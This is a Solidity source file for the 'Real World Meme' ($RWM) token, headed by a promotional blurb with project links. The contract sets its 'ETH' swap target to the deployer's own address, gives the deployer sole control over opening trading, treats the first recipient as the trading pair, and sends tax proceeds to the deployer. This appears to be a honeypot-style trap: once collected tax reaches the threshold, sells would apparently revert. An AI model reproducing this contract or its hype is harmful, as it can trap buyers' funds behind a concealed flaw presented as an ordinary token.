/**
Real World Meme - Bridging Humor and Finance

In the ever-evolving landscape of cryptocurrencies, a unique project has
emerged that not only captures the essence of internet culture but also
brings a novel approach to the world of decentralized finance.
Introducing Real World Meme  $RWM, a cryptocurrency that leverages the
power of memes to create a vibrant and engaging financial ecosystem.
$RWM is not just a cryptocurrency project; it's a movement that challenges
the conventional notions of finance. By infusing humor and community
engagement into its core, $RWM strives to create a financial ecosystem that
is not only efficient but also enjoyable. In a world where laughter is a
universal language, $RWM aims to speak the language of the future.


Website: https://realworldmeme.org/
Telegram: https://t.me/RealWorldMeme
Twitter: https://twitter.com/RealWorld_Meme
Medium: https://medium.com/@RealWorldMeme
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract RealWorldMeme {
    string public constant name = unicode"Real World Meme";  //
    string public constant symbol = "RWM";  //
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100000000000 * 10**decimals;

    uint256 constant buyTax = 2;
    uint256 constant sellTax = 2;
    uint256 constant swapAmount = totalSupply / 100;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address private pair;
    address constant ETH = 0xd9a02B9C7731AD9d3a27a207aa08e0f8De88421C;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant deployer = payable(address(0xd9a02B9C7731AD9d3a27a207aa08e0f8De88421C)); //

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == deployer || to == deployer);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this)){
            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(!tradingOpen);
        require(msg.sender == deployer);
        tradingOpen = true;        
    }
}